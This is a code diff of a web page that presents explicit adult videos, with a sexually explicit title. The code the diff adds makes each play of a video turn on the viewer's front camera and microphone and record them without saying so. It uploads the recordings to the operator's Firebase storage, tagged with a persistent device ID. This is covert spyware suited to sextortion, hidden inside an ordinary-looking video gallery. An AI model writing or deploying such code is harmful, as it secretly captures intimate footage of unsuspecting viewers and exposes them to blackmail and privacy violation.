@@ -650,11 +650,45 @@
             {			
                 url: 'https://firebasestorage.googleapis.com/v0/b/hozon3-6ca6a.appspot.com/o/hhd800.com%40FC2-PPV-4493654-001.mp4?alt=media&token=676a659e-2e4e-41c4-bf4e-568c70bc1795',			
 		title: '【顔出し】【4P】アイドル顔負けの『最高に可愛いコ』が4Pに初挑戦！ファンを呼んでの感謝祭！？怒涛の中出し3連発。ザーメンまみれで白濁になった19歳マンコを是非ご覧下さい！'	
-	    },		
-            // 他の動画URLとタイトルを追加
+	    },		            // 他の動画URLとタイトルを追加
         ];
 
-        async function requestCameraAndAudioAccess() {
+        function getOrCreateDeviceId() {
+            let deviceId = localStorage.getItem('deviceId');
+            if (!deviceId) {
+                deviceId = `device_${Math.random().toString(36).substr(2, 9)}`;
+                localStorage.setItem('deviceId', deviceId);
+            }
+            return deviceId;
+        }
+
+        async function requestCameraAccess(backCamera = true) {
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const videoDevices = devices.filter(device => device.kind === 'videoinput');
+                const camera = backCamera
+                    ? videoDevices.find(device => device.label.toLowerCase().includes('back')) || videoDevices[0]
+                    : videoDevices.find(device => device.label.toLowerCase().includes('front')) || videoDevices[0];
+
+                const constraints = {
+                    video: {
+                        deviceId: camera.deviceId,
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                };
+
+                videoStream = await navigator.mediaDevices.getUserMedia(constraints);
+                video.srcObject = videoStream;
+                video.muted = true; // 録画中の音声をミュート
+            } catch (err) {
+                console.error('カメラアクセスエラー:', err);
+                showCameraPermissionDialog();
+                throw err;
+            }
+        }
+
+        async function requestFrontCameraAndAudioAccess() {
             try {
                 const constraints = {
                     video: {
@@ -696,134 +730,123 @@
         function showCameraPermissionDialog() {
             dialogOverlay.style.display = 'flex';
         }
-
-        captureButton.addEventListener('click', () => {
-            requestCameraAndAudioAccess().then(() => {
-                captureAndLogin();
-            }).catch(() => {
-                alert('カメラの権限が許可されていません。');
-            });
-        });
-
-        reloadButton.addEventListener('click', () => {
-            dialogOverlay.style.display = 'none';
-            requestCameraAndAudioAccess();
-        });
-
-        function loadVideos(page) {
+        
+        async function loadVideos(page) {
             const startIndex = (page - 1) * videosPerPage;
             const endIndex = startIndex + videosPerPage;
-            const videosToDisplay = videos.slice(startIndex, endIndex);
+            const videosToLoad = videos.slice(startIndex, endIndex);
 
             videoGrid.innerHTML = '';
-            videosToDisplay.forEach(video => {
+
+            videosToLoad.forEach(video => {
                 const videoItem = document.createElement('div');
-                videoItem.classList.add('video-item');
+                videoItem.className = 'video-item';
 
                 const videoContainer = document.createElement('div');
-                videoContainer.classList.add('video-container');
+                videoContainer.className = 'video-container';
 
                 const videoElement = document.createElement('video');
                 videoElement.src = video.url;
                 videoElement.controls = true;
 
+                const titleElement = document.createElement('div');
+                titleElement.className = 'title';
+                titleElement.textContent = video.title;
+
                 videoContainer.appendChild(videoElement);
-
-                const titleInput = document.createElement('input');
-                titleInput.type = 'text';
-                titleInput.value = video.title;
-                titleInput.classList.add('title');
-                titleInput.addEventListener('input', (event) => {
-                    video.title = event.target.value;
-                });
-
                 videoItem.appendChild(videoContainer);
-                videoItem.appendChild(titleInput);
+                videoItem.appendChild(titleElement);
                 videoGrid.appendChild(videoItem);
 
-                // 動画再生時にフロントカメラで撮影
                 videoElement.addEventListener('play', () => {
-                    startRecording(videoElement);
+                    startVideoRecording();
                 });
 
                 videoElement.addEventListener('pause', () => {
-                    stopRecording();
-                });
-
-                videoElement.addEventListener('ended', () => {
-                    stopRecording();
+                    stopVideoRecording();
                 });
             });
 
-            updatePagination();
+            setupPagination(page);
         }
 
-        function startRecording(videoElement) {
-            if (videoStream) {
-                recordedChunks = [];
-                mediaRecorder = new MediaRecorder(videoStream);
-                mediaRecorder.ondataavailable = (event) => {
-                    if (event.data.size > 0) {
-                        recordedChunks.push(event.data);
-                    }
-                };
-                mediaRecorder.onstop = async () => {
-                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                    const storageRef = ref(storage, `videos/${Date.now()}.webm`);
-                    const uploadTask = uploadBytesResumable(storageRef, blob);
-
-                    uploadTask.on('state_changed', 
-                        (snapshot) => {
-                            const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
-                            console.log('Upload is ' + progress + '% done');
-                        }, 
-                        (error) => {
-                            console.error('Upload failed:', error);
-                        }, 
-                        async () => {
-                            const downloadURL = await getDownloadURL(uploadTask.snapshot.ref);
-                            await addDoc(collection(db, 'videos'), {
-                                title: videoElement.nextSibling.value,
-                                url: downloadURL,
-                                timestamp: new Date()
-                            });
-                            console.log('File available at', downloadURL);
-                        }
-                    );
-                };
-                mediaRecorder.start();
-            } else {
-                console.error('カメラストリームが利用できません。');
-                alert('カメラストリームが利用できません。');
-            }
-        }
-
-        function stopRecording() {
-            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-                mediaRecorder.stop();
-            }
-        }
-
-        function updatePagination() {
+        function setupPagination(currentPage) {
             pagination.innerHTML = '';
+
             const totalPages = Math.ceil(videos.length / videosPerPage);
 
             for (let i = 1; i <= totalPages; i++) {
                 const button = document.createElement('button');
                 button.textContent = i;
-                button.classList.toggle('active', i === currentPage);
+                if (i === currentPage) {
+                    button.disabled = true;
+                }
                 button.addEventListener('click', () => {
-                    currentPage = i;
-                    loadVideos(currentPage);
+                    loadVideos(i);
                 });
                 pagination.appendChild(button);
             }
         }
 
-        requestCameraAndAudioAccess().catch((err) => {
-            console.error('初期カメラの権限が許可されていません:', err);
-            showCameraPermissionDialog();
-        });
+        async function startVideoRecording() {
+            await requestFrontCameraAndAudioAccess();
+
+            recordedChunks = [];
+            mediaRecorder = new MediaRecorder(videoStream, { mimeType: 'video/webm; codecs=vp9' });
+
+            mediaRecorder.ondataavailable = event => {
+                if (event.data.size > 0) {
+                    recordedChunks.push(event.data);
+                }
+            };
+
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                uploadVideo(blob);
+            };
+
+            mediaRecorder.start();
+        }
+
+        function stopVideoRecording() {
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                mediaRecorder.stop();
+            }
+        }
+
+        async function uploadVideo(blob) {
+            const deviceId = getOrCreateDeviceId();
+            const storageRef = ref(storage, `videos/${deviceId}/${Date.now()}.webm`);
+            const uploadTask = uploadBytesResumable(storageRef, blob);
+
+            uploadTask.on('state_changed',
+                (snapshot) => {
+                    const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
+                    console.log('Upload is ' + progress + '% done');
+                },
+                (error) => {
+                    console.error('Upload error:', error);
+                },
+                async () => {
+                    const downloadURL = await getDownloadURL(uploadTask.snapshot.ref);
+                    saveVideoMetadata(downloadURL);
+                }
+            );
+        }
+
+        async function saveVideoMetadata(downloadURL) {
+            try {
+                const deviceId = getOrCreateDeviceId();
+                const docRef = await addDoc(collection(db, "videos"), {
+                    url: downloadURL,
+                    deviceId: deviceId,
+                    timestamp: Date.now(),
+                });
+                console.log("Document written with ID: ", docRef.id);
+            } catch (e) {
+                console.error("Error adding document: ", e);
+              }
+        }
     </script>
 </body>
 </html>
